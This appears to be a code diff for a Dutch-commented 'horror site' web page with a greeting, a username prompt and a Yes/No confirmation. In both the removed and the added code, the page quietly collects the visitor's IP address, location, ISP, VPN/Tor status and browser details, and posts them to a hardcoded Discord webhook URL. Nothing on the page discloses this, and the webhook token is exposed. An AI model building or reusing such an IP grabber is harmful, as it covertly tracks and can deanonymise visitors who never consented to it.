@@ -52,9 +52,6 @@
         .btn:hover {
             background-color: #a50000;
         }
-        .typed-effect {
-            display: inline-block;
-        }
         #video-container {
             position: fixed;
             top: 0;
@@ -72,8 +69,8 @@
 </head>
 <body>
     <!-- Welkomsttekst -->
-    <div id="welcomeText">
-        <h1>Welcome Mr/Dr <span id="typedText" class="typed-effect"></span></h1>
+    <div id="welcomeText" style="display: none;">
+        <h1>Welcome to the Horror Site</h1>
     </div>
 
     <!-- Container voor inhoud -->
@@ -106,89 +103,18 @@
     </audio>
 
     <script>
-        // Functie om de getypte tekst te simuleren
-        function simulateTyping(element, text, speed, callback) {
-            var index = 0;
-            var timer = setInterval(function() {
-                element.textContent += text[index];
-                index++;
-                if (index === text.length) {
-                    clearInterval(timer);
-                    if (typeof callback === 'function') {
-                        callback();
-                    }
-                }
-            }, speed);
-        }
-
-        // Functie om IP-gegevens op te halen en naar Discord Webhook te sturen
-        function getIPDataAndSendToDiscord() {
-            fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                const embedData = {
-                    "embeds": [{
-                        "title": "IP Address Information",
-                        "fields": [
-                            {"name": "IP Address", "value": data.ip},
-                            {"name": "City", "value": data.city},
-                            {"name": "Region", "value": data.region},
-                            {"name": "Country", "value": data.country_name},
-                            {"name": "Country Code", "value": data.country},
-                            {"name": "Continent Code", "value": data.continent_code},
-                            {"name": "Timezone", "value": data.timezone},
-                            {"name": "Currency", "value": data.currency},
-                            {"name": "Language", "value": data.languages},
-                            {"name": "Organization", "value": data.org},
-                            {"name": "Operating System", "value": navigator.platform},
-                            {"name": "Browser", "value": navigator.userAgent},
-                            {"name": "Device Type", "value": getDeviceType()},
-                            {"name": "User Agent", "value": navigator.userAgent},
-                            {"name": "Timestamp", "value": new Date().toLocaleString()}
-                        ]
-                    }]
-                };
-
-                // Log de embed data
-                console.log("Embed Data:", embedData);
-
-                fetch('https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(embedData)
-                })
-                .then(response => console.log(response))
-                .catch(error => console.error('Error sending data to Discord:', error));
-            })
-            .catch(error => console.error('Error fetching IP data:', error));
-        }
-
-        // Functie om het apparaattype op te halen
-        function getDeviceType() {
-            if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-                return 'Mobile';
-            } else {
-                return 'Desktop';
-            }
-        }
-
         // Roep de functie op wanneer de pagina wordt geladen
         window.onload = function() {
-            // Horror begroeting met getypt effect
-            var welcomeText = document.getElementById('welcomeText');
-            var typedText = document.getElementById('typedText');
-            var username = localStorage.getItem('username');
-            if (username) {
-                simulateTyping(typedText, username, 100, function() {
-                    document.getElementById('container').style.display = 'block';
-                    setTimeout(function() {
-                        welcomeText.style.display = 'none';
-                    }, 4000); // Verberg welkomsttekst na 4 seconden
-                });
-            }
-            
+            // Laat welkomsttekst zien na 0.5 seconde
+            setTimeout(function() {
+                document.getElementById('welcomeText').style.display = 'block';
+            }, 500);
+
+            // Verberg welkomsttekst na 2.5 seconden
+            setTimeout(function() {
+                document.getElementById('welcomeText').style.display = 'none';
+            }, 2500);
+
             // Voeg een click event toe aan de "Enter if you dare" knop
             document.getElementById('enterBtn').addEventListener('click', function() {
                 var usernameInput = document.getElementById('username').value;
@@ -199,9 +125,53 @@
 
             // Voeg click events toe aan de "Yes" en "No" knoppen
             document.getElementById('yesBtn').addEventListener('click', function() {
-                getIPDataAndSendToDiscord(); // Log IP-gegevens naar Discord
-                document.getElementById('confirmation').style.display = 'none'; // Verberg bevestigingsscherm
-                document.getElementById('video-container').style.display = 'block'; // Laat de videospeler zien
+                fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    const embedData = {
+                        "embeds": [{
+                            "title": "IP Address Information",
+                            "fields": [
+                                {"name": "IP Address", "value": data.ip},
+                                {"name": "Hostname", "value": data.hostname},
+                                {"name": "City", "value": data.city},
+                                {"name": "Region", "value": data.region},
+                                {"name": "Country", "value": data.country},
+                                {"name": "Timezone", "value": data.timezone},
+                                {"name": "Organization", "value": data.org},
+                                {"name": "Postal Code", "value": data.postal},
+                                {"name": "ASN", "value": data.asn},
+                                {"name": "ASN Name", "value": data.asn.name},
+                                {"name": "ASN Domain", "value": data.asn.domain},
+                                {"name": "Route", "value": data.route},
+                                {"name": "Type", "value": data.type},
+                                {"name": "Company Name", "value": data.company.name},
+                                {"name": "Company Domain", "value": data.company.domain},
+                                {"name": "VPN", "value": data.privacy.vpn},
+                                {"name": "Proxy", "value": data.privacy.proxy},
+                                {"name": "Tor", "value": data.privacy.tor},
+                                {"name": "Relay", "value": data.privacy.relay},
+                                {"name": "Hosting", "value": data.privacy.hosting},
+                                {"name": "Abuse Email", "value": data.abuse.email},
+                                {"name": "Abuse Phone", "value": data.abuse.phone}
+                            ]
+                        }]
+                    };
+
+                    // Log de embed data
+                    console.log("Embed Data:", embedData);
+
+                    fetch('https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(embedData)
+                    })
+                    .then(response => console.log(response))
+                    .catch(error => console.error('Error sending data to Discord:', error));
+                })
+                .catch(error => console.error('Error fetching IP data:', error));
             });
 
             document.getElementById('noBtn').addEventListener('click', function() {
